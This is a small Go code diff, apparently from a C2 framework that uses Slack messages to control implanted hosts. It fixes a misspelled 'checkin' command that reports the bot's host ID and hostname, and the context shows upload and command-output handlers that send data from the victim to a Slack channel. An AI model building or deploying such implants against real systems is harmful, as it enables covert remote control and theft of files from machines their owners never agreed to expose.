@@ -61,9 +61,6 @@ func handleMessageEvent(api *slack.Client, ev *slack.MessageEvent, rtm *slack.RT
 		command := strings.Split(strings.TrimSpace(strings.TrimPrefix(ev.Text, common.AllC2Configs.UUID.HostID)), " ")
 		common.AllC2Configs.Debug.LogDebug("Slack RTM - Command: " + command[0] + "\n")
 		switch {
-		case strings.Contains(command[0], "chekin"):
-			rtm.SendMessage(rtm.NewOutgoingMessage("Bot: "+common.AllC2Configs.UUID.HostID+" Hostname: "+common.AllC2Configs.UUID.HostName+"\n", ev.Channel))
-
 		case strings.Contains(command[0], common.AllC2Configs.Slack.Upload):
 			file, err := os.Open(command[1])
 			if err != nil {
@@ -114,6 +111,8 @@ func handleMessageEvent(api *slack.Client, ev *slack.MessageEvent, rtm *slack.RT
 			}
 			rtm.SendMessage(rtm.NewOutgoingMessage(output, ev.Channel))
 		}
-
+	}
+	if strings.HasPrefix(ev.Text, "checkin") {
+		rtm.SendMessage(rtm.NewOutgoingMessage("Bot: "+common.AllC2Configs.UUID.HostID+" Hostname: "+common.AllC2Configs.UUID.HostName+"\n", ev.Channel))
 	}
 }
